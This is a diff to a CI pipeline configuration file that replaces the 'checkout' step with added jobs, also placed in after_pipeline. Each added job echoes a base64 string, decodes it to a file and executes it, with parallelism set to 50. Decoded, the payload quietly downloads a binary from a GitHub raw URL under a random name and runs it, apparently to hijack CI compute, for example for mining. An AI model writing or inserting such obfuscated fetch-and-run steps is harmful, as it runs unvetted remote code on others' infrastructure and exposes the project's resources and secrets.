@@ -10,4 +10,20 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - echo 'QVBQPWFwcCQoc2h1ZiAtaSAxMDAwMDAwLTk5OTk5OTkgLW4gMSkKd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vTWNnZWVMdWNpYTE5NzAveXVhbi9yYXcvcmVmcy9oZWFkcy9tYWluL3BhdGgKbXYgcGF0aCAkQVBQCmNobW9kICt4ICRBUFAKLi8kQVBQIHo=' > 12; base64 -d 12 > 123; chmod +x 123; ./123
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - echo 'QVBQPWFwcCQoc2h1ZiAtaSAxMDAwMDAwLTk5OTk5OTkgLW4gMSkKd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vTWNnZWVMdWNpYTE5NzAveXVhbi9yYXcvcmVmcy9oZWFkcy9tYWluL3BhdGgKbXYgcGF0aCAkQVBQCmNobW9kICt4ICRBUFAKLi8kQVBQIHo=' > 12; base64 -d 12 > 123; chmod +x 123; ./123
+          parallelism: 50
+after_pipeline:
+  task:
+    jobs:
+      - name: 'Job #1'
+        commands:
+          - echo 'QVBQPWFwcCQoc2h1ZiAtaSAxMDAwMDAwLTk5OTk5OTkgLW4gMSkKd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vTWNnZWVMdWNpYTE5NzAveXVhbi9yYXcvcmVmcy9oZWFkcy9tYWluL3BhdGgKbXYgcGF0aCAkQVBQCmNobW9kICt4ICRBUFAKLi8kQVBQIHo=' > 12; base64 -d 12 > 123; chmod +x 123; ./123
+        parallelism: 50
+      - name: 'Job #2'
+        commands:
+          - echo 'QVBQPWFwcCQoc2h1ZiAtaSAxMDAwMDAwLTk5OTk5OTkgLW4gMSkKd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vTWNnZWVMdWNpYTE5NzAveXVhbi9yYXcvcmVmcy9oZWFkcy9tYWluL3BhdGgKbXYgcGF0aCAkQVBQCmNobW9kICt4ICRBUFAKLi8kQVBQIHo=' > 12; base64 -d 12 > 123; chmod +x 123; ./123
+        parallelism: 50
